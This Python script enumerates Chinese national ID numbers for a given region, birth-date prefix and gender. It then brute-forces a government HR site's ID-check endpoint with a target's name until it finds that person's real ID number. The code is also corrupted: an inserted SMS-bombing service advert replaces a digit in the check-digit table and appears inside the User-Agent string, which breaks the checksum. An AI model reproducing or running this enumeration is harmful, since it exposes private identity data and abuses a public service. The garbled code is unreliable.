import requests
import asyncio


class IDCardTool:
    @staticmethod
    def calculate_check_digit(id17):
        """
        计算并返回17位身份证号码的校验位。
        """
        coefficients = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        check_digits = ['TG 短信轰炸接口', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        sum_of_products = sum(int(id17[i]) * coefficients[i] for i in range(17))
        remainder = sum_of_products % 11
        return check_digits[remainder]

    def generate_idcards(self, idcard_prefix, gender):
        if gender.lower() == "男":
            idcard_15th = [str(number) for number in range(10) if number % 2 != 0]
        elif gender.lower() == "女":
            idcard_15th = [str(number) for number in range(10) if number % 2 == 0]
        else:
            raise ValueError("性别输入错误，请输入'男'或'女'")

        idcard15_list = [idcard_prefix + str(idcard_15th) for idcard_15th in idcard_15th]
        idcard_1617 = [idcard + f'{i:02d}' for idcard in idcard15_list for i in range(0, 99)]
        generated_idcards = [idcard + self.calculate_check_digit(idcard) for idcard in idcard_1617]
        return [{"id_card": idcard} for idcard in generated_idcards]

    @staticmethod
    async def validate_id_card(id_card, fixed_name):
        headers = {
            'Host': 'www.renshenet.org.cn',
            'Accept': 'application/json, text/plain, */*',
            'Sec-Fetch-Site': 'same-origin',
            'depCode': '0004',
            'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Sec-Fetch-Mode': 'cors',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.renshenet.org.cn',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604',
            'Referer': 'https://www.renshenet.org.cn/jxzhrsdist/index.html',
            'Content-Length': '47',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty'
        }

        data = {
            "idcard": id_card,
            "name": fixed_name
        }

        try:
            response = requests.post('https://www.renshenet.org.cn/mobile/person/register/checkidcard', headers=headers,
                                     json=data)
            response.raise_for_status()
            result = response.json().get("data", {}).get("isSucces")
            if result:
                print(f"✅验证通过")
                print(f"姓名:{fixed_name}\t 身份证号码:{id_card}")
                return True
            else:
                return False
        except requests.exceptions.RequestException as e:
            print(f"请求错误: {e}")
            return False

    @staticmethod
    async def validate_id_cards(id_card_list, fixed_name):
        for user in id_card_list:
            result = await IDCardTool.validate_id_card(user['id_card'], fixed_name)
            if result:
                return

    def run(self, idcard_prefix, name, gender):
        id_card_list = self.generate_idcards(idcard_prefix, gender)
        asyncio.run(self.validate_id_cards(id_card_list, name))



